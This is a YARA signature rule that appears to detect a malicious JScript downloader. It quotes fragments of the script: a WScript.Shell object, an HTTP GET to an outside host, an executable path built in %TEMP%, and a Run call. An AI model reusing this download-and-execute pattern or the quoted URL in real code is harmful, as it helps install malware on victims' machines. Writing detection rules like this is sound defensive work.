rule sig_20160330_a6f31b0c883e68fa5fd1d854bc476736 {
  meta:
    description = "datamaliciousorder - file 20160330_a6f31b0c883e68fa5fd1d854bc476736.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "5ffe19ae7af140ee92a35035f19fcad3e7522adeb77c5f79ab311b6e9c6f398d"

  strings:
    $s1  = "var XK0 = function D() {return WScript[F](\"WScript\"+\".Shell\");}(), LM = 11;" fullword ascii
    $s2  = "PX[XK](\"GET\", \"http://buygrocery.nz/l7dsp\", false);" fullword ascii
    $s3  = "function S(C, G3){J = J * 1; return C - G3;};" fullword ascii
    $s4  = "if (PX[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function PN(){return LN + \"\";};" fullword ascii
    $s6  = "function G() {return XK0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"j7J0GBHe8ov.ex\" + \"e\";};" fullword ascii
    $s7  = "function X(P){XK0[\"Run\"](P, J, J);};" fullword ascii
    $s8  = "function UX() {return ((Y0 == true) && (Y0 == EE)) ? 1 : J;};" fullword ascii
    $s9  = "function M()" fullword ascii
    $s10 = "}while (Y);" fullword ascii
    $s11 = "function FL(){return 22;};" fullword ascii
    $s12 = "return S(D0, KQ);" fullword ascii
    $s13 = "function B(T) {var HY = (1, 2, 3, 4, 5, T); return HY;};" fullword ascii
    $s14 = "function LL(){return F;};" fullword ascii
    $s15 = "var SM = new this[\"Date\"]();" fullword ascii
    $s16 = "var X0 = false;" fullword ascii
    $s17 = "var Y0 = false;" fullword ascii
    $s18 = "Y0 = true; " fullword ascii
    $s19 = "EE = true; " fullword ascii
    $s20 = "var EE = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}